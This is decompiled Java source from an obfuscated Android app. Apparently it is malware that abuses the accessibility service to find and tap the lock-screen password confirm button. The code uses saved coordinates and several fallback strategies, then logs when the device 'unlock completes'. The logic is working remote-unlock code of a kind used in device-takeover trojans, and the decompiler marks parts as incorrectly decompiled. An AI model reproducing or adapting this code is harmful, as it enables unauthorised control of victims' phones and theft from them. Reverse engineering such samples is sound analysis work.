package com.storm.safe.rock.service;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.util.Iterator;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.dh0;
import p000.kg1;
import p000.l10;
import p000.l81;
import p000.t60;
import p000.w00;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$performSmartConfirmDetection$2", m214403f = "dqtvuisjd.kt", m214404l = {7439, 7507}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$performSmartConfirmDetection$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public Object f52632a1;

    /* renamed from: a2 */
    public String f52633a2;

    /* renamed from: a3 */
    public Pair f52634a3;

    /* renamed from: a4 */
    public int f52635a4;

    /* renamed from: a5 */
    public final /* synthetic */ dqtvuisjd f52636a5;

    /* renamed from: a6 */
    public final /* synthetic */ String f52637a6;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$performSmartConfirmDetection$2(InterfaceC0876mv interfaceC0876mv, dqtvuisjd dqtvuisjdVar, String str) {
        super(2, interfaceC0876mv);
        this.f52636a5 = dqtvuisjdVar;
        this.f52637a6 = str;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$performSmartConfirmDetection$2(interfaceC0876mv, this.f52636a5, this.f52637a6);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$performSmartConfirmDetection$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:48:0x0246, code lost:
    
        if (p000.b81.m210571b1(1500, r28) == r7) goto L49;
     */
    /* JADX WARN: Removed duplicated region for block: B:42:0x01aa A[Catch: Exception -> 0x005e, TRY_LEAVE, TryCatch #0 {Exception -> 0x005e, blocks: (B:9:0x004e, B:50:0x0249, B:52:0x0251, B:56:0x0275, B:63:0x0333, B:64:0x0386, B:57:0x02e8, B:40:0x01a4, B:42:0x01aa, B:47:0x01f5, B:59:0x030d, B:45:0x01d7, B:16:0x006d, B:29:0x00cb, B:31:0x00d3, B:35:0x00e3, B:37:0x016e, B:39:0x0187, B:19:0x0078, B:21:0x0080, B:23:0x0086, B:25:0x008c, B:38:0x017c, B:43:0x01d0), top: B:68:0x003e, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x032d  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0386 A[Catch: Exception -> 0x005e, TRY_LEAVE, TryCatch #0 {Exception -> 0x005e, blocks: (B:9:0x004e, B:50:0x0249, B:52:0x0251, B:56:0x0275, B:63:0x0333, B:64:0x0386, B:57:0x02e8, B:40:0x01a4, B:42:0x01aa, B:47:0x01f5, B:59:0x030d, B:45:0x01d7, B:16:0x006d, B:29:0x00cb, B:31:0x00d3, B:35:0x00e3, B:37:0x016e, B:39:0x0187, B:19:0x0078, B:21:0x0080, B:23:0x0086, B:25:0x008c, B:38:0x017c, B:43:0x01d0), top: B:68:0x003e, inners: #1 }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:48:0x0246 -> B:50:0x0249). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:59:0x030d -> B:58:0x0303). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        Object obj2;
        Object obj3;
        Object obj4;
        Object obj5;
        Object obj6;
        Object obj7;
        Pair pair;
        Object obj8;
        Iterator it;
        C1351vv c1351vv = C1351vv.f60710b1;
        String str = this.f52637a6;
        final dqtvuisjd dqtvuisjdVar = this.f52636a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52635a4;
        String str2 = "method";
        String str3 = "❌ 策略 ";
        Object obj9 = "timestamp";
        String str4 = "(";
        Object obj10 = PollingXHR.Request.EVENT_SUCCESS;
        try {
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "智能确认检测异常", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
            if (dqtvuisjdVar.m211489i3()) {
                t60.m214714d6("dqtvuisjd", "✅ 设备已经解锁成功，跳过确认按钮检测");
                return c1351vv;
            }
            Pair pairM211408a7 = dqtvuisjd.m211408a7(dqtvuisjdVar);
            if (pairM211408a7 != null) {
                Object obj11 = pairM211408a7.f57557a1;
                obj6 = "result";
                Object obj12 = pairM211408a7.f57556a0;
                obj7 = "coordinates";
                t60.m214714d6("dqtvuisjd", "🎯 [保存坐标优先] 使用保存的确认按钮坐标，跳过其他检测策略: (" + obj12 + ", " + obj11 + ")");
                dqtvuisjdVar.m211497j1(((Number) obj12).floatValue(), ((Number) obj11).floatValue());
                this.f52632a1 = pairM211408a7;
                this.f52635a4 = 1;
                if (b81.m210571b1(1500L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                pair = pairM211408a7;
            } else {
                obj2 = "result";
                obj3 = "coordinates";
                obj4 = obj9;
                obj5 = obj10;
                t60.m214702c3("dqtvuisjd", "ℹ️ 没有保存的确认按钮坐标，使用其他检测策略");
                obj9 = obj4;
                obj8 = obj2;
                it = AbstractC1117qo.m214451e7(new Pair(StringUtil.m212470a0("KloSP14rBSxePSJNCA=="), new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performSmartConfirmDetection$2$strategies$1
                    {
                        super(0);
                    }

                    @Override // p000.w00
                    public final Object invoke() {
                        String string;
                        String string2;
                        String string3;
                        dqtvuisjd dqtvuisjdVar2 = dqtvuisjdVar;
                        dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                        Float fValueOf = Float.valueOf(-1.0f);
                        try {
                            AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                            if (rootInActiveWindow == null) {
                                return null;
                            }
                            AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55778c8, dh0.f55752a2), AbstractC0716jf.m213306g5("→", "✓", "✔", "send", "search", "return", "newline", "enter key")));
                            AccessibilityNodeInfo accessibilityNodeInfoM211463f4 = dqtvuisjdVar2.m211463f4(rootInActiveWindow);
                            t60.m214714d6("dqtvuisjd", "🔍 策略1-学习坐标: ".concat(accessibilityNodeInfoM211463f4 != null ? "成功" : "失败"));
                            if (accessibilityNodeInfoM211463f4 == null) {
                                l81 l81Var = dqtvuisjdVar2.f52424f5;
                                if (l81Var != null && l81Var.m213791a3()) {
                                    t60.m214714d6("dqtvuisjd", "🔍 策略2-UI分析: 成功找到并点击确认按钮");
                                    return new Pair(fValueOf, fValueOf);
                                }
                                t60.m214714d6("dqtvuisjd", "🔍 策略2-UI分析: 失败");
                            }
                            if (accessibilityNodeInfoM211463f4 == null) {
                                accessibilityNodeInfoM211463f4 = dqtvuisjdVar2.m211464f5(rootInActiveWindow);
                                t60.m214714d6("dqtvuisjd", "🔍 策略3-锁屏按钮: ".concat(accessibilityNodeInfoM211463f4 != null ? "成功" : "失败"));
                            }
                            t60.m214714d6("dqtvuisjd", "🔍 策略4-软键盘按钮: 跳过（已在UI分析中处理）");
                            if (accessibilityNodeInfoM211463f4 == null) {
                                t60.m214714d6("dqtvuisjd", "🔍 策略5-右下角按钮: 跳过（方法不可用）");
                            }
                            if (accessibilityNodeInfoM211463f4 == null) {
                                t60.m214702c3("dqtvuisjd", "🔍 所有策略均失败，无法检测到确认按钮");
                                return null;
                            }
                            Rect rect = new Rect();
                            accessibilityNodeInfoM211463f4.getBoundsInScreen(rect);
                            float fCenterX = rect.centerX();
                            float fCenterY = rect.centerY();
                            CharSequence text = accessibilityNodeInfoM211463f4.getText();
                            String str5 = "";
                            if (text == null || (string = text.toString()) == null) {
                                string = "";
                            }
                            CharSequence contentDescription = accessibilityNodeInfoM211463f4.getContentDescription();
                            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                string2 = "";
                            }
                            CharSequence className = accessibilityNodeInfoM211463f4.getClassName();
                            if (className != null && (string3 = className.toString()) != null) {
                                str5 = string3;
                            }
                            t60.m214714d6("dqtvuisjd", "✅ 无障碍服务检测到确认按钮: (" + fCenterX + ", " + fCenterY + ")");
                            t60.m214714d6("dqtvuisjd", "✅ 确认按钮详情: 文本='" + string + "', 描述='" + string2 + "', 类名='" + str5 + "'");
                            return new Pair(Float.valueOf(fCenterX), Float.valueOf(fCenterY));
                        } catch (Exception e2) {
                            t60.m214705c6("dqtvuisjd", "无障碍确认按钮检测失败", e2);
                            return null;
                        }
                    }
                })).iterator();
                if (!it.hasNext()) {
                }
            }
        } else if (i == 1) {
            pair = (Pair) this.f52632a1;
            kg1.m213544f4(obj);
            obj6 = "result";
            obj7 = "coordinates";
        } else {
            if (i != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            Pair pair2 = this.f52634a3;
            String str5 = this.f52633a2;
            it = (Iterator) this.f52632a1;
            kg1.m213544f4(obj);
            String str6 = "(";
            obj8 = "result";
            Object obj13 = "coordinates";
            String str7 = "method";
            dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
            if (dqtvuisjdVar.m211489i3()) {
                t60.m214714d6("dqtvuisjd", "🎉 策略 " + str5 + " 点击成功，解锁完成!");
                String str8 = str.equals("numeric") ? "NUMERIC_PASSWORD_START" : "MIXED_PASSWORD_INPUT";
                AbstractC0770a1.m213614f9(new Pair("passwordType", str), new Pair(str7, str5), new Pair(obj13, str6 + pair2.f57556a0 + ", " + pair2.f57557a1 + ")"), new Pair(obj8, obj10), new Pair(obj9, new Long(System.currentTimeMillis())));
                dqtvuisjd.m211435k0(str8, "密码输入确认按钮点击");
                dqtvuisjd.m211434j9(dqtvuisjdVar, ((Number) pair2.f57556a0).floatValue(), ((Number) pair2.f57557a1).floatValue(), str5, 0.9f);
                dqtvuisjdVar.f52467j8 = System.currentTimeMillis();
                if (str5 != null || pair2 == null) {
                    t60.m214726f4("dqtvuisjd", "❌ 所有策略都失败，尝试最后的备用策略");
                    t60.m214726f4("dqtvuisjd", "❌ 所有确认策略都失败");
                    AbstractC0315a0.m211544a6("智能确认检测失败: 所有检测策略都无效");
                } else {
                    t60.m214714d6("dqtvuisjd", "🎉 智能确认检测成功: 策略=" + str5 + ", 坐标=(" + pair2.f57556a0 + ", " + pair2.f57557a1 + ")");
                    String str9 = AbstractC0315a0.f53025a0;
                    AbstractC0315a0.m211544a6("智能确认检测成功: 策略=" + str5 + ", 坐标=(" + pair2.f57556a0 + ", " + pair2.f57557a1 + ")");
                }
                return c1351vv;
            }
            str2 = str7;
            StringBuilder sb = new StringBuilder();
            String str10 = str3;
            sb.append(str10);
            sb.append(str5);
            sb.append(" 点击失败，继续尝试下一个策略");
            t60.m214726f4("dqtvuisjd", sb.toString());
            str3 = str10;
            str4 = str6;
            obj5 = obj10;
            obj3 = obj13;
            if (!it.hasNext()) {
                Pair pair3 = (Pair) it.next();
                str5 = (String) pair3.f57556a0;
                w00 w00Var = (w00) pair3.f57557a1;
                StringBuilder sb2 = new StringBuilder();
                obj10 = obj5;
                sb2.append("🔍 尝试策略: ");
                sb2.append(str5);
                t60.m214714d6("dqtvuisjd", sb2.toString());
                try {
                } catch (Exception unused) {
                    t60.m214695b6("策略 " + str5 + " 执行异常", "msg");
                    pair2 = null;
                }
                pair2 = (Pair) w00Var.invoke();
                if (pair2 != null) {
                    Object obj14 = pair2.f57556a0;
                    obj13 = obj3;
                    Object obj15 = pair2.f57557a1;
                    str6 = str4;
                    StringBuilder sb3 = new StringBuilder();
                    str7 = str2;
                    sb3.append("✅ 策略 ");
                    sb3.append(str5);
                    sb3.append(" 找到坐标: (");
                    sb3.append(obj14);
                    sb3.append(", ");
                    sb3.append(obj15);
                    sb3.append(")");
                    t60.m214714d6("dqtvuisjd", sb3.toString());
                    dqtvuisjdVar.m211497j1(((Number) pair2.f57556a0).floatValue(), ((Number) pair2.f57557a1).floatValue());
                    this.f52632a1 = it;
                    this.f52633a2 = str5;
                    this.f52634a3 = pair2;
                    this.f52635a4 = 2;
                } else {
                    str6 = str4;
                    obj13 = obj3;
                    str10 = str3;
                    t60.m214726f4("dqtvuisjd", str10 + str5 + " 未找到坐标");
                    str3 = str10;
                    str4 = str6;
                    obj5 = obj10;
                    obj3 = obj13;
                    if (!it.hasNext()) {
                        pair2 = null;
                        str5 = null;
                        if (str5 != null) {
                            t60.m214726f4("dqtvuisjd", "❌ 所有策略都失败，尝试最后的备用策略");
                            t60.m214726f4("dqtvuisjd", "❌ 所有确认策略都失败");
                            AbstractC0315a0.m211544a6("智能确认检测失败: 所有检测策略都无效");
                        }
                        return c1351vv;
                    }
                }
            }
        }
        dqtvuisjd.C0290a0 c0290a03 = dqtvuisjd.f52358m1;
        if (dqtvuisjdVar.m211489i3()) {
            t60.m214714d6("dqtvuisjd", "🎉 保存坐标确认按钮点击成功，解锁完成!");
            String str11 = str.equals("numeric") ? "NUMERIC_PASSWORD_START" : "MIXED_PASSWORD_INPUT";
            Pair pair4 = new Pair("passwordType", str);
            Pair pair5 = new Pair("method", "saved_coordinates");
            Object obj16 = pair.f57556a0;
            Object obj17 = pair.f57556a0;
            Object obj18 = pair.f57557a1;
            AbstractC0770a1.m213614f9(pair4, pair5, new Pair(obj7, "(" + obj16 + ", " + obj18 + ")"), new Pair(obj6, obj10), new Pair(obj9, new Long(System.currentTimeMillis())));
            dqtvuisjd.m211435k0(str11, "密码输入确认按钮点击");
            dqtvuisjd.m211434j9(dqtvuisjdVar, ((Number) obj17).floatValue(), ((Number) obj18).floatValue(), "saved_coords", 1.0f);
            dqtvuisjdVar.f52467j8 = System.currentTimeMillis();
            String str12 = AbstractC0315a0.f53025a0;
            AbstractC0315a0.m211544a6("智能确认检测成功: 策略=saved_coords, 坐标=(" + obj17 + ", " + obj18 + ")");
            return c1351vv;
        }
        obj4 = obj9;
        obj5 = obj10;
        obj2 = obj6;
        obj3 = obj7;
        t60.m214726f4("dqtvuisjd", "❌ 保存坐标确认按钮点击失败，继续尝试其他策略");
        obj9 = obj4;
        obj8 = obj2;
        it = AbstractC1117qo.m214451e7(new Pair(StringUtil.m212470a0("KloSP14rBSxePSJNCA=="), new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performSmartConfirmDetection$2$strategies$1
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                String string;
                String string2;
                String string3;
                dqtvuisjd dqtvuisjdVar2 = dqtvuisjdVar;
                dqtvuisjd.C0290a0 c0290a022 = dqtvuisjd.f52358m1;
                Float fValueOf = Float.valueOf(-1.0f);
                try {
                    AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                    if (rootInActiveWindow == null) {
                        return null;
                    }
                    AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55778c8, dh0.f55752a2), AbstractC0716jf.m213306g5("→", "✓", "✔", "send", "search", "return", "newline", "enter key")));
                    AccessibilityNodeInfo accessibilityNodeInfoM211463f4 = dqtvuisjdVar2.m211463f4(rootInActiveWindow);
                    t60.m214714d6("dqtvuisjd", "🔍 策略1-学习坐标: ".concat(accessibilityNodeInfoM211463f4 != null ? "成功" : "失败"));
                    if (accessibilityNodeInfoM211463f4 == null) {
                        l81 l81Var = dqtvuisjdVar2.f52424f5;
                        if (l81Var != null && l81Var.m213791a3()) {
                            t60.m214714d6("dqtvuisjd", "🔍 策略2-UI分析: 成功找到并点击确认按钮");
                            return new Pair(fValueOf, fValueOf);
                        }
                        t60.m214714d6("dqtvuisjd", "🔍 策略2-UI分析: 失败");
                    }
                    if (accessibilityNodeInfoM211463f4 == null) {
                        accessibilityNodeInfoM211463f4 = dqtvuisjdVar2.m211464f5(rootInActiveWindow);
                        t60.m214714d6("dqtvuisjd", "🔍 策略3-锁屏按钮: ".concat(accessibilityNodeInfoM211463f4 != null ? "成功" : "失败"));
                    }
                    t60.m214714d6("dqtvuisjd", "🔍 策略4-软键盘按钮: 跳过（已在UI分析中处理）");
                    if (accessibilityNodeInfoM211463f4 == null) {
                        t60.m214714d6("dqtvuisjd", "🔍 策略5-右下角按钮: 跳过（方法不可用）");
                    }
                    if (accessibilityNodeInfoM211463f4 == null) {
                        t60.m214702c3("dqtvuisjd", "🔍 所有策略均失败，无法检测到确认按钮");
                        return null;
                    }
                    Rect rect = new Rect();
                    accessibilityNodeInfoM211463f4.getBoundsInScreen(rect);
                    float fCenterX = rect.centerX();
                    float fCenterY = rect.centerY();
                    CharSequence text = accessibilityNodeInfoM211463f4.getText();
                    String str52 = "";
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfoM211463f4.getContentDescription();
                    if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                        string2 = "";
                    }
                    CharSequence className = accessibilityNodeInfoM211463f4.getClassName();
                    if (className != null && (string3 = className.toString()) != null) {
                        str52 = string3;
                    }
                    t60.m214714d6("dqtvuisjd", "✅ 无障碍服务检测到确认按钮: (" + fCenterX + ", " + fCenterY + ")");
                    t60.m214714d6("dqtvuisjd", "✅ 确认按钮详情: 文本='" + string + "', 描述='" + string2 + "', 类名='" + str52 + "'");
                    return new Pair(Float.valueOf(fCenterX), Float.valueOf(fCenterY));
                } catch (Exception e2) {
                    t60.m214705c6("dqtvuisjd", "无障碍确认按钮检测失败", e2);
                    return null;
                }
            }
        })).iterator();
        if (!it.hasNext()) {
        }
    }
}
